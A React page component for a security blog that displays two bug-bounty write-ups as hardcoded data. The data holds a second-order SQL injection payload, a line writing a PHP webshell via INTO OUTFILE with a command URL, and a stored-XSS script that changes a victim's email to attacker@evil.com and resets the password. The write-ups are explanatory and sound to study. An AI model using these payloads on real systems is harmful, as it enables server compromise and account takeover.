
import { useParams, Link } from "react-router-dom";
import { Terminal, ArrowLeft, Calendar, Clock, Award, Shield, Copy, Check } from "lucide-react";
import { Card, CardContent } from "@/components/ui/card";
import { useState } from "react";

const WriteupDetail = () => {
  const { id } = useParams();
  const [copiedCode, setCopiedCode] = useState<string | null>(null);

  const writeups = {
    "1": {
      title: "Advanced SQL Injection → RCE Chain",
      date: "2024-01-15",
      readTime: "15 min read",
      difficulty: "Critical",
      bounty: "$15,000",
      platform: "Private Program",
      tags: ["SQL Injection", "RCE", "Second-Order", "Privilege Escalation"],
      content: {
        summary: "Complete walkthrough of exploiting second-order SQLi to achieve remote code execution on a Fortune 500 target.",
        sections: [
          {
            title: "Initial Reconnaissance",
            content: "During the initial reconnaissance phase, I discovered a web application with multiple user input fields. The application appeared to be a customer management system with various functionalities including user registration, profile updates, and administrative features."
          },
          {
            title: "Vulnerability Discovery",
            content: "While testing the user registration functionality, I noticed that user input was being stored in the database without proper sanitization. However, the immediate SQL injection attempts failed, indicating potential filtering or WAF protection."
          },
          {
            title: "Second-Order SQL Injection",
            content: "The breakthrough came when I realized this was a second-order SQL injection. The malicious payload was stored safely during registration but executed when the admin viewed user profiles through the administrative interface.",
            code: `# Initial payload injection during registration
username: admin'/**/UNION/**/SELECT/**/1,2,3,4,5--
email: test@example.com

# Payload gets executed when admin views profile
# Resulting in: SELECT * FROM users WHERE username = 'admin'/**/UNION/**/SELECT/**/1,2,3,4,5--'`
          },
          {
            title: "Escalation to RCE",
            content: "After confirming the SQL injection, I escalated the attack by writing files to the web directory using MySQL's INTO OUTFILE functionality.",
            code: `# Writing PHP webshell to accessible directory
'; SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

# Accessing the webshell
https://target.com/shell.php?cmd=id`
          },
          {
            title: "Impact Assessment",
            content: "The vulnerability allowed for complete compromise of the web server, including access to sensitive customer data, internal network reconnaissance, and potential lateral movement within the corporate infrastructure."
          }
        ]
      }
    },
    "2": {
      title: "CSRF → Account Takeover via XSS Chain",
      date: "2024-01-10",
      readTime: "12 min read",
      difficulty: "High",
      bounty: "$8,500",
      platform: "HackerOne",
      tags: ["CSRF", "XSS", "Account Takeover", "DOM Manipulation"],
      content: {
        summary: "Chaining CSRF with Stored XSS to achieve complete account compromise. Full technical breakdown with PoC.",
        sections: [
          {
            title: "CSRF Vulnerability Discovery",
            content: "While testing the profile update functionality, I discovered that the application was vulnerable to Cross-Site Request Forgery (CSRF) attacks. The application relied solely on cookie-based authentication without proper CSRF tokens."
          },
          {
            title: "Stored XSS in Profile Fields",
            content: "Further testing revealed that certain profile fields were vulnerable to stored XSS attacks. The application failed to properly sanitize user input in the 'About Me' section.",
            code: `<script>
  // Stored XSS payload
  fetch('/api/user/profile', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      email: 'attacker@evil.com',
      password: 'newpassword123'
    })
  });
</script>`
          },
          {
            title: "Chaining the Attacks",
            content: "By combining CSRF with stored XSS, I created a powerful attack chain that could completely compromise user accounts without any user interaction beyond visiting a malicious page."
          }
        ]
      }
    }
  };

  const writeup = writeups[id as keyof typeof writeups];

  if (!writeup) {
    return (
      <div className="min-h-screen bg-black text-green-400 font-mono flex items-center justify-center">
        <div className="text-center">
          <h1 className="text-4xl font-bold text-red-400 mb-4">404 - Writeup Not Found</h1>
          <p className="text-green-400 mb-8">The requested exploit writeup could not be located.</p>
          <Link to="/blog" className="text-green-300 hover:text-green-200 transition-colors">
            ← Return to Writeups
          </Link>
        </div>
      </div>
    );
  }

  const copyToClipboard = (code: string, section: string) => {
    navigator.clipboard.writeText(code);
    setCopiedCode(section);
    setTimeout(() => setCopiedCode(null), 2000);
  };

  return (
    <div className="min-h-screen bg-black text-green-400 font-mono relative overflow-hidden">
      {/* Background effect */}
      <div className="fixed inset-0 opacity-5 pointer-events-none">
        <div className="absolute inset-0 bg-gradient-to-b from-green-900/20 via-transparent to-green-900/20"></div>
      </div>

      {/* Navigation */}
      <nav className="border-b border-green-800 bg-black/95 backdrop-blur-sm sticky top-0 z-50 shadow-lg shadow-green-900/20">
        <div className="container mx-auto px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <Terminal className="h-7 w-7 text-green-400 animate-pulse" />
              <span className="text-2xl font-bold text-green-400">
                v1g0<span className="text-red-400">_</span>blog
              </span>
              <span className="text-xs text-green-600 font-mono">[root@security]</span>
            </div>
            <div className="flex items-center space-x-8">
              <Link to="/" className="hover:text-green-300 transition-all duration-300">~/home</Link>
              <Link to="/blog" className="hover:text-green-300 transition-all duration-300">~/writeups</Link>
              <Link to="/about" className="hover:text-green-300 transition-all duration-300">~/whoami</Link>
            </div>
          </div>
        </div>
      </nav>

      <div className="container mx-auto px-6 py-12 max-w-4xl">
        {/* Header */}
        <div className="mb-12">
          <Link to="/blog" className="inline-flex items-center text-green-300 hover:text-green-200 mb-8 group">
            <ArrowLeft className="h-5 w-5 mr-2 group-hover:-translate-x-1 transition-transform" />
            <span className="font-mono">cd ../writeups</span>
          </Link>

          <div className="mb-6">
            <span className="text-green-500 font-mono text-sm bg-green-900/30 px-3 py-1 rounded border border-green-700">EXPLOIT_ANALYSIS</span>
          </div>

          <h1 className="text-4xl md:text-5xl font-bold text-green-400 mb-6 leading-tight">
            {writeup.title}
          </h1>

          <div className="flex flex-wrap items-center gap-6 mb-8">
            <div className="flex items-center space-x-2">
              <Calendar className="h-5 w-5 text-green-500" />
              <span className="text-green-300 font-mono">{writeup.date}</span>
            </div>
            <div className="flex items-center space-x-2">
              <Clock className="h-5 w-5 text-green-500" />
              <span className="text-green-300 font-mono">{writeup.readTime}</span>
            </div>
            <div className="flex items-center space-x-2">
              <Award className="h-5 w-5 text-green-500" />
              <span className="text-green-300 font-mono">{writeup.bounty}</span>
            </div>
            <div className="flex items-center space-x-2">
              <Shield className="h-5 w-5 text-green-500" />
              <span className="text-green-300 font-mono">{writeup.platform}</span>
            </div>
          </div>

          <div className="flex items-center space-x-4 mb-8">
            <span className={`text-xs px-3 py-1 rounded-full font-mono font-bold ${
              writeup.difficulty === 'Critical' 
                ? 'bg-red-800 text-red-200' 
                : writeup.difficulty === 'High'
                  ? 'bg-orange-800 text-orange-200'
                  : 'bg-yellow-800 text-yellow-200'
            }`}>
              {writeup.difficulty.toUpperCase()}
            </span>
            <div className="flex flex-wrap gap-2">
              {writeup.tags.map((tag, index) => (
                <span
                  key={index}
                  className="text-xs bg-green-800/50 text-green-200 px-2 py-1 rounded font-mono border border-green-700"
                >
                  #{tag}
                </span>
              ))}
            </div>
          </div>

          <div className="bg-gray-900/80 border border-green-800 rounded-lg p-6 backdrop-blur-sm">
            <h3 className="text-xl font-bold text-green-300 mb-3">Executive Summary</h3>
            <p className="text-green-400/80 leading-relaxed text-lg">
              {writeup.content.summary}
            </p>
          </div>
        </div>

        {/* Content Sections */}
        <div className="space-y-12">
          {writeup.content.sections.map((section, index) => (
            <Card key={index} className="bg-gray-900/80 border-green-800 backdrop-blur-sm">
              <CardContent className="p-8">
                <h2 className="text-2xl font-bold text-green-300 mb-6 flex items-center">
                  <span className="text-green-500 mr-3">{String(index + 1).padStart(2, '0')}.</span>
                  {section.title}
                </h2>
                
                <div className="text-green-400/80 leading-relaxed text-lg mb-6">
                  {section.content}
                </div>

                {section.code && (
                  <div className="relative">
                    <div className="bg-gray-950 border border-green-700 rounded-lg overflow-hidden">
                      <div className="bg-gray-800 px-4 py-2 flex items-center justify-between border-b border-green-700">
                        <span className="text-green-400 font-mono text-sm">exploit.py</span>
                        <button
                          onClick={() => copyToClipboard(section.code!, section.title)}
                          className="text-green-400 hover:text-green-300 transition-colors flex items-center space-x-1"
                        >
                          {copiedCode === section.title ? (
                            <>
                              <Check className="h-4 w-4" />
                              <span className="text-xs">Copied!</span>
                            </>
                          ) : (
                            <>
                              <Copy className="h-4 w-4" />
                              <span className="text-xs">Copy</span>
                            </>
                          )}
                        </button>
                      </div>
                      <pre className="p-6 text-green-300 font-mono text-sm overflow-x-auto">
                        <code>{section.code}</code>
                      </pre>
                    </div>
                  </div>
                )}
              </CardContent>
            </Card>
          ))}
        </div>

        {/* Footer */}
        <div className="mt-16 pt-8 border-t border-green-800">
          <div className="bg-gray-900/80 border border-green-800 rounded-lg p-6 backdrop-blur-sm">
            <div className="flex items-center justify-between">
              <div>
                <h3 className="text-xl font-bold text-green-300 mb-2">Responsible Disclosure</h3>
                <p className="text-green-400/80">
                  This vulnerability was reported through proper channels and has been patched by the vendor.
                </p>
              </div>
              <div className="text-right">
                <div className="text-2xl font-bold text-green-400 font-mono">{writeup.bounty}</div>
                <div className="text-green-600 text-sm font-mono">BOUNTY_EARNED</div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default WriteupDetail;
